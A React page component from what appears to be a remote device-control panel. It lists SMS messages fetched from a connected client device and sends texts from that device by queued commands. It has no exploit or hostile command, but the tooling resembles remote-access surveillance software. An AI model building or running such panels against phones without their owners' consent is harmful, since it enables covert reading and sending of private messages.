import { useState, useCallback, useEffect, useRef } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, SmsMessage } from '@/types';
import { CMD, normalizeSmsList, extractList } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { DataActionsMenu, buildDataActions } from '@/components/device/DataActionsMenu';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Send, MessageSquare } from 'lucide-react';
import { onDataUpdate } from '@/services/socket';

export default function SmsPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [sending, setSending] = useState(false);
  const [to, setTo] = useState('');
  const [message, setMessage] = useState('');
  const [localError, setLocalError] = useState<string | null>(null);
  const pendingSendRef = useRef<{ to: string; message: string; commandId: string } | null>(null);

  const { data: smsList, loading, error, refresh, sendCommand, commandStatus, commandId, commandSummary, clearData } = useDeviceData<SmsMessage[]>({
    clientId,
    page: 'sms',
    extractData: (d) => normalizeSmsList(extractList(d.list)),
    dataType: 'sms',
    defaultValue: [],
  });

  useEffect(() => {
    const unsub = onDataUpdate((cid, dataType, payload) => {
      if (cid !== clientId || dataType !== 'sms_status') return;
      if (payload?.status === 'error') {
        const errMsg = typeof payload.error === 'string' ? payload.error : 'SMS send failed on device';
        setLocalError(errMsg);

        if (pendingSendRef.current) {
          setTo(pendingSendRef.current.to);
          setMessage(pendingSendRef.current.message);
          pendingSendRef.current = null;
        }
        setSending(false);
      }

    });
    return unsub;
  }, [clientId]);

  useEffect(() => {
    if (commandStatus === 'responded' && commandId && pendingSendRef.current?.commandId === commandId) {

      const summary = commandSummary || '';
      const isSuccess = !summary.toLowerCase().includes('fail');
      if (isSuccess) {

        pendingSendRef.current = null;
        setLocalError(null);
        setTo('');
        setMessage('');
      }

      setSending(false);
    }
    if (commandStatus === 'error' && commandId && pendingSendRef.current?.commandId === commandId) {

      setLocalError('Failed to send SMS command');
      if (pendingSendRef.current) {
        setTo(pendingSendRef.current.to);
        setMessage(pendingSendRef.current.message);
        pendingSendRef.current = null;
      }
      setSending(false);
    }

    if (commandStatus === 'queued' && pendingSendRef.current) {

      setLocalError('Device offline. SMS queued for reconnect.');
      setSending(false);

    }
    if (commandStatus === 'idle' && pendingSendRef.current) {

      setSending(false);

      if (!localError) {
        setLocalError('SMS timed out. Retry when device is online.');
      }
      pendingSendRef.current = null;
    }
  }, [commandStatus, commandId, commandSummary, localError]);

  const dataActions = buildDataActions({ data: smsList, exportPrefix: 'sms', onClear: clearData });

  const fetchSms = useCallback(async () => {
    await sendCommand(CMD.SMS, { action: 'ls' });
  }, [sendCommand]);

  const sendSms = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!to || !message) return;
    setSending(true);
    setLocalError(null);
    try {
      const cmdId = await sendCommand(CMD.SMS, { action: 'sendSMS', to, sms: message });

      pendingSendRef.current = { to, message, commandId: cmdId };
    } catch (err: any) {
      setLocalError(err?.response?.data?.error || err?.message || 'Failed to send SMS');
      setSending(false);
    }
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="SMS Messages"
        subtitle={`${smsList.length} messages`}
        actions={[
          { label: 'Fetch SMS', icon: MessageSquare, onClick: fetchSms, disabled: loading || !online },
        ]}
        moreActions={<DataActionsMenu actions={dataActions} disabled={loading} />}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {(error || localError) && <ErrorAlert message={localError || error!} onRetry={refresh} />}

      <Card className="shadow-none">
        <CardContent className="p-3.5">
          <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2.5">Send SMS</p>
          <form onSubmit={sendSms} className="space-y-2 sm:space-y-0 sm:flex sm:gap-2">
            <Input placeholder="Phone number" value={to} onChange={(e) => setTo(e.target.value)} className="sm:w-44 h-9 text-sm" />
            <Input placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} className="flex-1 h-9 text-sm" />
            <Button type="submit" disabled={sending || !to || !message} size="sm" className="w-full sm:w-auto">
              <Send className="h-3.5 w-3.5 mr-1.5" />
              Send
            </Button>
          </form>
        </CardContent>
      </Card>

      {loading && !error ? (
        <LoadingSkeleton rows={6} />
      ) : smsList.length === 0 ? (
        <EmptyState
          icon={MessageSquare}
          title="No SMS messages"
          description="Click Fetch SMS to retrieve messages"
          action={{ label: 'Fetch SMS', onClick: fetchSms, disabled: loading || !online, loading: commandStatus === 'sending' }}
        />
      ) : (
        <Card className="shadow-none overflow-hidden">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead className="text-xs">From/To</TableHead>
                <TableHead className="text-xs">Message</TableHead>
                <TableHead className="text-xs">Date</TableHead>
                <TableHead className="text-xs">Type</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {smsList.map((sms, i) => (
                <TableRow key={`sms-${sms.address}-${sms.date}-${i}`}>
                  <TableCell className="font-mono text-xs">{sms.address || '-'}</TableCell>
                  <TableCell className="max-w-xs truncate text-xs">{sms.body || '-'}</TableCell>
                  <TableCell className="text-xs text-muted-foreground whitespace-nowrap">{sms.date || '-'}</TableCell>
                  <TableCell>
                    <Badge variant={sms.type === 1 ? 'default' : 'secondary'} className="text-[10px]">
                      {sms.type === 1 ? 'Received' : sms.type === 2 ? 'Sent' : `Type ${sms.type}`}
                    </Badge>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </Card>
      )}
    </div>
  );
}
